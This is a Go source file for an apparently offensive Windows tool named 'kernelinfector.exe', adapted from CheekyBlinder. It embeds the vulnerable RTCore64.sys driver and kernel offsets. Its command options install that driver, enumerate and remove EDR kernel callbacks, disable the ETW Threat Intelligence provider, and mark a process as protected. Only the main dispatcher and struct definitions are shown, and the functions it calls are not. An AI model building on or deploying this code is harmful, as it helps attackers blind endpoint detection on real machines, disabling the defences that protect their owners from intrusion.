package main

// https://github.com/br-sn/CheekyBlinder - multiple code snippets were re-used here
//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	"bufio"
	_ "embed"
	"fmt"
	"os"
	"time"
)

//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
//sys GetDeviceDriverBaseNameW(lpImageBase uintptr,lpBaseName uintptr, nSize uint32) (ret uint32,err error) = psapi.GetDeviceDriverBaseNameW
//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
//sys SetEntriesInAclW(cCountOfExplicitEntries uint32, pListOfExplicitEntries *windows.EXPLICIT_ACCESS, OldAcl *windows.ACL, NewAcl **windows.ACL) (ret uint32) = advapi32.SetEntriesInAclW

//go:embed resources/NtoskrnlOffsets.csv
var ntoskrnlOffsetsCSV string

//go:embed resources/RTCore64.sys
var binfile []byte

type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	HANDLE  uintptr
	BYTE    byte
)
type NtoskrnlOffsets struct {
	ntoskrnlVersion                string
	pspCreateProcessNotifyRoutine  uint64
	pspCreateThreadNotifyRoutine   uint64
	pspLoadImageNotifyRoutine      uint64
	psProtection                   uint64
	etwThreatIntProvRegHandle      uint64
	etwRegEntryGuidEntry           uint64
	etwGuidEntryProviderEnableInfo uint64
}

type Rtcore64MemoryRead struct {
	Pad0     [8]byte
	Address  DWORD64
	Pad1     [8]byte
	ReadSize DWORD
	Value    DWORD
	Pad3     [16]byte
}

type SECURITY_DESCRIPTOR struct {
	Revision byte
	Sbz1     byte
	Control  uint16
	Owner    uintptr
	Group    uintptr
	Sacl     uintptr
	Dacl     uintptr
}

type KRNL_CALLBACK struct {
	driver         string
	callbackAddr   uint64
	callbackStruct uint64
	callbackFunc   uint64
	removed        bool
}

type FOUND_EDR_CALLBACKS struct {
	index         uint64
	EDR_CALLBACKS [256]KRNL_CALLBACK
}

//24byte
type SYSTEM_HANDLE_TABLE_ENTRY_INFO struct {
	UniqueProcessId       uint16
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint8
	HandleAttributes      uint8
	HandleValue           uint16
	Object                uintptr
	GrantedAccess         uint32
}

type SYSTEM_HANDLE_INFORMATION struct {
	NumberOfHandles uint32                           //4
	Handles         []SYSTEM_HANDLE_TABLE_ENTRY_INFO //any size
}

func main() {

	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
	getNtoskrnlVersion()
	if len(os.Args) < 2 {
		fmt.Println(usage)
	} else if os.Args[1] == "/enum" {
		enumAllEDRKernelCallbacks()
		if isETWThreatIntelProviderEnabled() {
			fmt.Println("Enabled!!!!!!!!")
		}
		//findProcessCallbackRoutine("")
	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
		//r := os.Args[2]
		//findProcessCallbackRoutine(r)
	} else if os.Args[1] == "/removeall" {
		removeAllEDRKernelCallbacks()
		ntoskrnlOffsets := getNtoskrnlVersion()
		changeStatusETWThreatIntelProvider(&ntoskrnlOffsets, false)
		//makeSystem()
	} else if os.Args[1] == "/install" {
		installVulnDriver()
	} else if os.Args[1] == "/uninstall" {
		uninstallVulnDriver()
	} else if os.Args[1] == "/test" {
		setProcessAsProtected()
		//getEPROCESSAddress()
		bufio.NewScanner(os.Stdin).Scan()
		time.Sleep(100000)
	} else {
		fmt.Println(usage)
	}

	//CSV output
	//CSV import
}
